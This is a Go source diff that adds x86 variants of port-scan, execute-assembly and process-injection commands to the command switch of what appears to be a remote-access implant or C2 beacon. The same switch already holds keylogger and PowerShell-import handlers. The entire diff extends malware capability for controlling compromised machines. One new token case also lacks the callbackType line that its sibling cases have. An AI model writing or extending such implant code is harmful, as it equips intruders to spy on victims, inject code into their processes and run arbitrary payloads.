@@ -134,15 +134,23 @@ func main() {
 							case packet.CMD_TYPE_PORTSCAN_X64:
 								result, err = services.CmdPortscanX64(cmdBuf)
 								callbackType = 0
+							case packet.CMD_TYPE_PORTSCAN_X86:
+								result, err = services.CmdPortscanX86(cmdBuf)
+								callbackType = 0
 							case packet.CMD_TYPE_KEYLOGGER:
 								result, err = services.CmdKeylogger(cmdBuf)
 								callbackType = 0
 							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_X64:
 								result, err = services.CmdExecuteAssemblyX64(cmdBuf)
 								callbackType = 0
+							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_X86:
+								result, err = services.CmdExecuteAssemblyX86(cmdBuf)
+								callbackType = 0
 							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64:
 								result, err = services.CmdExecuteAssemblyX64(cmdBuf)
 								callbackType = 0
+							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86:
+								result, err = services.CmdExecuteAssemblyX86(cmdBuf)
 							case packet.CMD_TYPE_IMPORT_POWERSHELL:
 								result, err = services.CmdImportPowershell(cmdBuf)
 								callbackType = 0
@@ -151,6 +159,9 @@ func main() {
 								callbackType = 0
 							case packet.CMD_TYPE_INJECT_X64:
 								result, err = services.CmdInjectX64(cmdBuf)
+								callbackType = 0
+							case packet.CMD_TYPE_INJECT_X86:
+								result, err = services.CmdInjectX86(cmdBuf)
 								callbackType = 0
 							default:
 								err = errors.New("This type is not supported now.")
